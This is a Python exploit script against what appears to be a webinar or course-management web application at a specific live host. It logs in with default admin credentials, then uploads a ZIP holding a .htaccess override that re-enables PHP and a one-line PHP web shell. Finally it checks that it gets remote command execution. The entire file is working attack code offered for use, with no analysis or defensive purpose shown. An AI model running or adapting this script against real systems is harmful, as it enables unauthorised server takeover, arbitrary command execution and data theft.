import requests
import zipfile
import io
import re
import os
import random
import string
import base64
import time

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        return "/admin" in r.url or "/panel" in r.url
    except: return False

def get_csrf(url):
    r = session.get(url)
    match = re.search(r'name="csrf-token" content="([^"]+)"', r.text)
    if not match: match = re.search(r'name="_token" value="([^"]+)"', r.text)
    return match.group(1) if match else None

def main():
    if not login():
        print("[-] Login failed.")
        return

    # 1. Scrape webinar
    print("[*] Scraping webinar info...")
    r = session.get(f"{BASE_URL}/admin/webinars")
    web_match = re.search(r'/admin/webinars/(\d+)/edit', r.text)
    web_id = web_match.group(1) if web_match else "2009"
    r = session.get(f"{BASE_URL}/admin/webinars/{web_id}/edit")
    chap_match = re.search(r'value="(\d+)"[^>]*>Chap', r.text)
    chap_id = chap_match.group(1) if chap_match else "30"
    
    print(f"[*] Target Webinar: {web_id}, Chapter: {chap_id}")

    # 2. Local .htaccess to allow PHP in this specific subfolder
    # We want to undo the restrictions from /store/.htaccess
    htaccess = """
Options +ExecCGI
AddHandler php8-cgi .php
<FilesMatch ".php$">
    Order allow,deny
    Allow from all
    Require all granted
</FilesMatch>
<IfModule mod_php.c>
    php_flag engine on
</IfModule>
<IfModule mod_php7.c>
    php_flag engine on
</IfModule>
<IfModule mod_php8.c>
    php_flag engine on
</IfModule>
"""
    shell = "<?php system($_GET['c']); ?>"
    
    rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    zip_filename = f"{rand_name}.zip"
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        # NO TRAVERSAL. Just put it in the zip.
        # It will be extracted to /store/1/webinars/2009/files/rand_name/
        z.writestr('.htaccess', htaccess)
        z.writestr('s.php', shell)
    buf.seek(0)
    
    # 3. Trigger via Panel
    csrf = get_csrf(f"{BASE_URL}/panel/courses/{web_id}/edit")
    if not csrf:
        print("[-] CSRF not found.")
        return
        
    print(f"[*] Uploading ZIP with local .htaccess ({zip_filename})...")
    payload = {
        'ajax[new][webinar_id]': web_id,
        'ajax[new][chapter_id]': chap_id,
        'ajax[new][title]': 'HTOverride ' + rand_name,
        'ajax[new][accessibility]': 'free',
        'ajax[new][storage]': 'upload_archive',
        'ajax[new][interactive_type]': 'custom',
        'ajax[new][interactive_file_name]': 's.php',
        'ajax[new][status]': 'on',
        '_token': csrf
    }
    files = {'ajax[new][file_upload]': (zip_filename, buf, 'application/zip')}
    
    r = session.post(f"{BASE_URL}/panel/files/store", data=payload, files=files)
    print(f"[*] Post Response: {r.status_code}")
    
    # 4. Verify
    shell_url = f"{BASE_URL}/store/1/webinars/{web_id}/files/{rand_name}/s.php"
    print(f"[*] Verifying Shell: {shell_url}?c=id")
    time.sleep(2) # Wait for extraction
    res = session.get(shell_url + "?c=id")
    
    if res.status_code == 200 and "uid=" in res.text:
        print(f"[!!!!] SUCCESS! LOCAL OVERRIDE WORKED! {shell_url}?c=id")
        print(f"Output: {res.text.strip()}")
    else:
        print(f"[-] Shell failed (Status: {res.status_code})")
        if res.status_code == 403:
             print("[!] 403 Forbidden - Override may not be allowed by server config (AllowOverride).")

if __name__ == "__main__":
    main()
